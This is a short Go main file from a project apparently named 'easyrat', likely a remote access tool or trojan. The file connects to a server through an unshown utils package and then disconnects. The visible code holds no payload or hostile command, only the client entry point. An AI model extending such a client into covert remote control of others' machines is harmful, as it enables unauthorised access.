package main

import (
	"easyrat/utils"
)

func main() {
	// Connect to the server
	if err := utils.ConnectServer(); err != nil {
		panic("Could not connect to the server! " + err.Error())
	}

	// After program execution disconnect from the server
	utils.DisconnectServer()
}
